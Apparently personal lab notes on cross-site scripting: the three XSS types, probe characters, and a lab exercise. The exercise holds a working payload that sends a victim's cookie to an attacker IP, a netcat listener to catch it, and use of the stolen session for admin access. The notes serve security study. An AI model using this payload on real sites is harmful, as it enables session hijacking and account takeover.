# Types of XSS
In a web-application, data sanitization is extremely important so as to prevent the attacker from injecting and potentially executing malicious code.

There are three types of XSS: **stored**, **reflected** and **DOM-based**. 

**Stored XSS** is when the the exploit payload is stored in the database or the server. When someone views the vulnerable page, the server retrieves this payload and displays to that person This usually exists in forum software - comment sections, or in product reviews.

**Reflected XSS** is when the payload is included in a crafted request or link. The web app takes the value and places into the page content, attacking the person submitting the request or viewing the link (you can craft a malicious link/request and ask someone else to click). This often occurs where there are user input.

DOM-based XSS attacks are similar to the other two types but are solely within the page's Document Object Model (DOM).

# Identifying XSS Vulnerabilities

We can identify input fields and examine them for any vulnerabilities by testing out common special characters.
```
< > ' " { } ;
```

- `< >` are used in HTML to denote elements.
- `{ }` are used in JavaScript as function declarations.
- `' "` are used to denote strings.
- `;` are used to mark the end of a statement.

If these characters are not encoded or sanitised, the application is vulnerable to XSS attacks, as we can then use our inputs to change the code, allowing us to build malicious code that can be executed within the victim's browser.

# Basic XSS
This basic XSS is demonstrated on the Windows 10 Lab Machine. 

When faced with a user input field, we can first test to see if the special characters are being sanitised (removed or encoded). Once we can confirm that they are not removed, we can start to craft a basic XSS payload: `<script>alert('XSS')</script>`.

# Topical Exercises

### Exercise 1:
Attack Machine: 
Windows 10 Lab Machine:
```bash
# Payload to put on web app
<script>new Image().src="http://192.168.119.164/cool.jpg?output="+document.cookie;</script>
```

```powershell
# Edit Powershell script
$username="admin"
$password="p@ssw0rd"
$url_login="http://127.0.0.1/login.php"

$ie = New-Object -com InternetExplorer.Application
$ie.Visible = $true
$ie.navigate("$url_login")
while($ie.ReadyState -ne 4){ start-sleep -m 1000}
$ie.document.getElementsByName("username")[0].value="$username"
$ie.document.getElementsByName("password")[0].value="$password"
start-sleep -m 10
$ie.document.getElementsByClassName("btn")[0].click()
start-sleep -m 10000 # increase time delay
$ie.Quit()
```

```bash
# Run on attacker's machine to get victim's cookie
sudo nc -nvlp 80
```

Got the cookie: PHPSESSID=e1al2favu71fhgtskkroo4cejq

Input into the attacker's browser via Cookie-Editor, and obtain admin access.
